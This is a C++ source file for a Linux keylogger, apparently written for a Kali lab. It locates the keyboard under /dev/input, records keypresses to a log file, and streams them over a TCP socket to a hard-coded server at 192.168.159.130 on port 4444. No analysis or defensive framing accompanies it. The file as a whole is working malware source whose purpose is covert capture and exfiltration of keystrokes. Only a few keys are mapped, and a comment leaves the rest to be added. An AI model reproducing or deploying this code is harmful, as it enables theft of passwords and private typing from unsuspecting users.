/*
┌──(kali㉿kali)-[~]
└─$ g++ keylogger_linux.cpp -o keylogger_linux
*/
#include <iostream>
#include <fstream>
#include <string>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/input-event-codes.h>

using namespace std;

// IP address and port of socket server
const string SERVER_IP = "192.168.159.130";  // Put your server IP here
const int SERVER_PORT = 4444;         // Put your server port here

int main() {
    string keys;
    int keyboard_fd = -1;

    // Identify the keyboard device
    for (int i = 0; i <= 32; i++) {
        string dev_path = "/dev/input/event" + to_string(i);
        keyboard_fd = open(dev_path.c_str(), O_RDONLY | O_NONBLOCK);
        if (keyboard_fd != -1) {
            char name[256] = "Unknown";
            if (ioctl(keyboard_fd, EVIOCGNAME(sizeof(name)), name) < 0) {
                cout << "Error getting keyboard device name." << endl;
                close(keyboard_fd);
                return 1;
            }
            if (string(name).find("keyboard") != string::npos) {
                // keyboard device found
                break;
            }
            close(keyboard_fd);
        }
    }

    if (keyboard_fd == -1) {
        cout << "No keyboard device found." << endl;
        return 1;
    }

    int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_fd == -1) {
        cout << "Error creating socket." << endl;
        return 1;
    }

    // Connecting to socket server
    struct sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP.c_str(), &(serverAddr.sin_addr)) <= 0) {
        cout << "Invalid IP address." << endl;
        return 1;
    }
    if (connect(socket_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        cout << "Error connecting to server." << endl;
        return 1;
    }

    while (true) {
        struct input_event ev;
        read(keyboard_fd, &ev, sizeof(struct input_event));

        if (ev.type == EV_KEY && ev.value == 1) {
            switch (ev.code) {
                case KEY_A:
                    cout << "a";
                    keys += "a";
                    break;
                case KEY_B:
                    cout << "b";
                    keys += "b";
                    break;
                // Add cases for the other keys here...

                case KEY_ENTER:
                    cout << "<br>";
                    keys += "<br>";
                    break;
                case KEY_SPACE:
                    cout << " ";
                    keys += " ";
                    break;
                case KEY_DOT:
                    cout << ".";
                    keys += ".";
                    break;
                default:
                    break;
            }

            ofstream myfile;
            myfile.open("keylogger_linux.log", ios::app); // Replace "log file" with your desired path and file name
            myfile << keys;
            myfile.close();

            // Send data to socket server
            if (send(socket_fd, keys.c_str(), keys.length(), 0) == -1) {
                cout << "Error sending data to server." << endl;
                return 1;
            }
        }
    }

    close(keyboard_fd);
    close(socket_fd);
    return 0;
}
